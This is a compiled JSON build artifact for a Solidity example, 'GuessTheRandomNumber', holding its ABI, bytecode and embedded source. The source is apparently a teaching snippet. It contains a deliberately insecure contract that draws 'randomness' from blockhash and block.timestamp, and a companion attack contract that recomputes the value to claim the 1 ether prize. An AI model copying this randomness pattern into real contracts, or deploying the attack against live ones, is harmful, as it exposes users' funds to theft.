{
  "contractName": "GuessTheRandomNumber",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_guess",
          "type": "uint256"
        }
      ],
      "name": "guess",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052610387806100136000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c80639189fec114610030575b600080fd5b61004a60048036038101906100459190610186565b61004c565b005b600060014361005b91906101e2565b404260405160200161006e929190610262565b6040516020818303038152906040528051906020012060001c9050808214156101475760003373ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a76400006040516100bf906102bf565b60006040518083038185875af1925050503d80600081146100fc576040519150601f19603f3d011682016040523d82523d6000602084013e610101565b606091505b5050905080610145576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161013c90610331565b60405180910390fd5b505b5050565b600080fd5b6000819050919050565b61016381610150565b811461016e57600080fd5b50565b6000813590506101808161015a565b92915050565b60006020828403121561019c5761019b61014b565b5b60006101aa84828501610171565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006101ed82610150565b91506101f883610150565b92508282101561020b5761020a6101b3565b5b828203905092915050565b6000819050919050565b6000819050919050565b61023b61023682610216565b610220565b82525050565b6000819050919050565b61025c61025782610150565b610241565b82525050565b600061026e828561022a565b60208201915061027e828461024b565b6020820191508190509392505050565b600081905092915050565b50565b60006102a960008361028e565b91506102b482610299565b600082019050919050565b60006102ca8261029c565b9150819050919050565b600082825260208201905092915050565b7f6661696c656420746f2073656e64206574686572000000000000000000000000600082015250565b600061031b6014836102d4565b9150610326826102e5565b602082019050919050565b6000602082019050818103600083015261034a8161030e565b905091905056fea2646970667358221220d5add6c3bc55df2e7aea10a3978fe00b4017db5f6d6d7c2c11d586dc8f62a64e64736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract GuessTheRandomNumber {\n    constructor() payable {}\n\n    function guess(uint _guess) public {\n        uint answer = uint(\n            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))\n        );\n\n        if (_guess == answer) {\n            (bool sent, ) = msg.sender.call{value: 1 ether}(\"\");\n            require(sent, \"failed to send ether\");\n        }\n    }\n}\n\ncontract AttackGuessTheRandomNumber {\n    receive() external payable {}\n\n    function attack(GuessTheRandomNumber guessTheRandomNumber) public {\n        uint answer = uint(\n            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))\n        );\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}",
  "sourcePath": "/Users/mac/Documents/GitHub/CodeSnippets/Solidity/polygon/contracts/GuessTheRandomNumber.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2021-12-25T14:36:45.238Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}